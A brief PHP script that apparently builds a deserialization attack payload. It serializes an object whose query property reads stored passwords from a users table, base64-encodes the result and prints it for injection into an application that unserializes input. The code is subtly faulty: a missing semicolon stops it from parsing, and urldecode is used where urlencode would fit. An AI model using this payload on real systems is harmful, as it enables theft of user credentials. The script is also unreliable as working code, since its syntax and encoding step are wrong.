<?php
class SQL {
    public $query = "SELECT password as username from users;"
}
$obj = new SQL();
echo urldecode(base64_encode(serialize( $obj)));
?> 